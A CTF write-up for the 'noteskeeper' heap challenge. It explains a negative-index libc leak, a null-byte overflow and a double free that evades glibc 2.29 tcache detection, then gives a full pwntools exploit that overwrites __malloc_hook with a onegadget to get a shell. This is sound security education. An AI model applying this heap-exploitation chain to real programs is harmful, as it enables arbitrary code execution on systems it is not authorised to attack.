# noteskeeper

The description for this challenge is as follows:

*A friend of mine told me that he uses a strong notes keeper to write his diaries there. Can you prove him wrong and pwn it?*

This challenge had a total of 25 solves, and was worth 397 points at the end of the competition. I would rate this at the harder end of medium since it is a non-trivial heap challenge; some pre-requisites would be familiarity with [overwriting malloc or free hooks](https://github.com/knittingirl/CTF-Writeups/tree/main/pwn_challs/Imaginary_CTF/string_editor_1) and an understanding of [tcache chunk forgery](https://github.com/knittingirl/CTF-Writeups/tree/main/pwn_challs/HTB%20UniCTF%20Finals%202022/Robo-quest). Out-of-bounds reads from an array are also used.

**TL;DR Solution:** Note that when chunks are viewed, the address at which the contents are stored is printed. Inputting negative values here can "view" chunks from the GOT area, which will produce a reliable libc leak. Also note a null byte overflow when contents are written to a note, and that when notes are deleted, their addresses are not removed from the array, suggesting the possibility of a UAF or double free. Given the libc version (2.29), a double free can successfully be used without triggering error detection by freeing a chunk, overflowing its size with the null byte, and freeing it again to push it into a different tcache bin. The double free can then be combined with the libc leak to overwrite the forward pointer of my double-freed bin to the malloc hook, allocate a chunk there, write a onegadget there, and trigger it to get a shell.

## Gathering Information:

Another team member actually found the first vulnerability on this one by fuzzing inputs; they determined that notes could be viewed even at indexes that hadn't been allocated and, better yet, at negative indexes. -16, and other indices, show probable libc leaks.
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/GDG_Algiers22/notes_keeper/lib$ ./chall
1- Add note
2- Remove note
3- Edit note
4- View note
Enter an option: 4
Index: -16
This note is located at: 0x7fd7c16c5c00H
1- Add note
2- Remove note
3- Edit note
4- View note
Enter an option:
```
Now, to do a bit more reverse engineering, one thing to note is that the edit note option doesn't actually do anything. The add note option is more interesting. We can add up to three notes, and we get to specify a size between 0 and 0x200 in size. After a chunk of that size is mallocced, we can read content of the specified length into the chunk. The interesting part is effort to null-terminate the input, which places a null at a distance of length of read-in input plus one from the start of the input buffer. This ultimately means that we have a single null-byte overflow in the heap (technically I could also overwrite the second byte away with a null byte, but a single null-byte overflow is more widely applicable). This will allow me to overwrite the lowest byte of a chunk size.
```
  if (created_entries < '\x03') {
    printf("Size: ");
    fgets(note_size,8,stdin);
    uVar1 = atoi(note_size);
    if ((uVar1 == 0) || (0x200 < uVar1)) {
      puts("Invalid size");
    }
    else {
      __buf = (long *)malloc((ulong)uVar1);
      if (__buf == (long *)0x0) {
        printf("Error occured while allocating memory");
      }
      else {
        printf("Note content: ");
        sVar2 = read(0,__buf,(ulong)uVar1);
        *(undefined *)((long)__buf + (long)(int)sVar2 + 1) = 0;
        (&entries)[(int)created_entries] = __buf;
        created_entries = created_entries + '\x01';
        puts("Note added");
      }
    }
  }
```
The remove note function is also interesting. It frees an entry at a given index, but it does not check that the index in question is actually an allocated chunk or that it is less than the 3 we are supposedly limited to. After some experimentation, I determined that I could abuse this to allocate more chunks by freeing an offset whose value is null. This won't do anything but decrement the global counting how many entries have been created. Finally, it also fails to clear the pointer to the heap chunk in the entries array. This presents a UAF vulnerability; however, we can't directly edit created chunks since that functionality is not present here.
```
void remove_note(void)

{
  long in_FS_OFFSET;
  uint local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_14 = 0;
  printf("Note index: ");
  __isoc99_scanf("%d",&local_14);
  free((&entries)[local_14]);
                    /* I think I can abuse this to create significantly more notes. */
  created_entries = created_entries + -1;
  puts("Note removed");
```
In the absence of a direct edit functionality, a seemingly obvious option is to try to double free a chunk. When a chunk is double freed, you can allocate a chunk of the same size and overwrite the forward pointer. The next chunk of that size will be allocated at the overwritten forward pointer's location, giving us an arbitrary write. However, libc 2.29 provides double free protection:
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/GDG_Algiers22/notes_keeper/lib$ ./chall
1- Add note
2- Remove note
3- Edit note
4- View note
Enter an option: 1
Size: 32
Note content: aaaaaaaaaaaa
Note added
1- Add note
2- Remove note
3- Edit note
4- View note
Enter an option: 2
Note index: 0
Note removed
1- Add note
2- Remove note
3- Edit note
4- View note
Enter an option: 2
Note index: 0
free(): double free detected in tcache 2
Aborted
```

## Using a Null-Byte Overflow to Avoid Double-Free Detection

In order to avoid double-free detection in libc 2.29, I can use the null-byte overflow to change the size of my bin between frees. The basic idea is:

*1:* Allocate two chunks, the first of which's size should be designed to allow a null byte overflow (i.e. it should equal 8 modulo 16), and the second of which's size should be in the triple digits when represented in hexadecimal. I went for 0x108, which went in a 0x110-sized bin

*2:* Free the second chunk. It should go into a tcache bin.

*3:* Free the first chunk, then allocate a new chunk of the same size so that it will be placed in the same position on the heap, directly before my free second chunk.

*4:* Fill that re-allocated first chunk and overflow the now-freed second chunk's size with a null. The chunk should now be in a 0x100 bin.

*5:* Now free the second chunk again. We have a double free, and it isn't detected.

So, now we have a double free, which gives us an arbitrary read. We can combine this with the array index read bug to overwrite values in libc, so we can overwrite the malloc hook with a onegadget.

Here is the final payload:
```
from pwn import *

target = process('./chall')

pid = gdb.attach(target, "\nb *add_note+250\nb *remove_note+102\nb *view_note+179\ncontinue")
#target = remote('pwn.chal.ctf.gdgalgiers.com', 1405)


def add_note(size, content):
	print(target.recvuntil(b'Enter an option:'))
	target.sendline(b'1')
	print(target.recvuntil(b'Size:'))
	target.sendline(str(size))
	print(target.recvuntil(b'Note content:'))
	target.send(content)
	
def remove_note(index):
	print(target.recvuntil(b'Enter an option:'))
	target.sendline(b'2')
	print(target.recvuntil(b'index:'))
	target.sendline(str(index))

def view_note(index):
	print(target.recvuntil(b'Enter an option:'))
	target.sendline(b'4')
	print(target.recvuntil(b'Index:'))
	target.sendline(str(index))

libc = ELF('libc.so.6')
#Get my libc leak
view_note(-17)
print(target.recvuntil(b'located at: '))
leak = target.recv(14)
atoi = int(leak, 16)
print(hex(atoi))
libc_base = atoi - libc.symbols['atoi']
malloc_hook = libc_base + libc.symbols['__malloc_hook']
print(hex(malloc_hook))
onegadget = libc_base + 0xe21d1


add_note(0xf8, b'a' * 8)
add_note(0x108, b'b' * 8)

remove_note(0)
remove_note(1)
#Getting my null-byte overflow
add_note(0xf8, b'a' * (0xf8-1))
#Here's the double free
remove_note(1) 
#Overwrite forward pointer of the 0x110 bin with malloc hook
add_note(0xf8, p64(malloc_hook))
#Placeholder
add_note(0x108, b'a')
#Let's me allocate another chunk
remove_note(3)
#Allocates over the malloc hook
add_note(0x108, p64(onegadget)) 
#Let's me allocate again
remove_note(3)

#Trigger the malloc and onegadget.
print(target.recvuntil(b'Enter an option:'))
target.sendline(b'1')
print(target.recvuntil(b'Size:'))
target.sendline(str(0x28))


target.interactive()
```
Here is how the script looks when run:
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/GDG_Algiers22/notes_keeper/lib$ python3 noteskeeper_exploit.py NOPTRACE
[+] Starting local process './chall': pid 296
[!] Skipping debug attach since context.noptrace==True
[*] '/mnt/c/Users/Owner/Desktop/CTF_Files/GDG_Algiers22/notes_keeper/lib/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
b'1- Add note\n2- Remove note\n3- Edit note\n4- View note\nEnter an option:'
b' Index:'
noteskeeper_exploit.py:27: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  target.sendline(str(index))
b' This note is located at: '
0x7fdec01b12c0
0x7fdec0350c30
b'H\x83\xec\x08\xba\n\n1- Add note\n2- Remove note\n3- Edit note\n4- View note\nEnter an option:'
b' Size:'
noteskeeper_exploit.py:13: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  target.sendline(str(size))
b' Note content:'
b' Note added\n1- Add note\n2- Remove note\n3- Edit note\n4- View note\nEnter an option:'
b' Size:'
b' Note content:'
b' Note added\n1- Add note\n2- Remove note\n3- Edit note\n4- View note\nEnter an option:'
b' Note index:'
noteskeeper_exploit.py:21: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  target.sendline(str(index))
b' Note removed\n1- Add note\n2- Remove note\n3- Edit note\n4- View note\nEnter an option:'
b' Note index:'
b' Note removed\n1- Add note\n2- Remove note\n3- Edit note\n4- View note\nEnter an option:'
b' Size:'
b' Note content:'
b' Note added\n1- Add note\n2- Remove note\n3- Edit note\n4- View note\nEnter an option:'
b' Note index:'
b' Note removed\n1- Add note\n2- Remove note\n3- Edit note\n4- View note\nEnter an option:'
b' Size:'
b' Note content:'
b' Note added\n1- Add note\n2- Remove note\n3- Edit note\n4- View note\nEnter an option:'
b' Size:'
b' Note content:'
b' Note added\n1- Add note\n2- Remove note\n3- Edit note\n4- View note\nEnter an option:'
b' Note index:'
b' Note removed\n1- Add note\n2- Remove note\n3- Edit note\n4- View note\nEnter an option:'
b' Size:'
b' Note content:'
b' Note added\n1- Add note\n2- Remove note\n3- Edit note\n4- View note\nEnter an option:'
b' Note index:'
b' Note removed\n1- Add note\n2- Remove note\n3- Edit note\n4- View note\nEnter an option:'
b' Size:'
noteskeeper_exploit.py:66: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  target.sendline(str(0x28))
[*] Switching to interactive mode
 $ ls
chall  flag.txt    libc-2.29.so  noteskeeper_exploit.py
core   ld-2.29.so  libc.so.6     noteskeeper_payload.py
$ cat flag.txt
flag{I_f0rgot_To_s4v3_the_r34l_fl4g}
$
```
Thanks for reading!
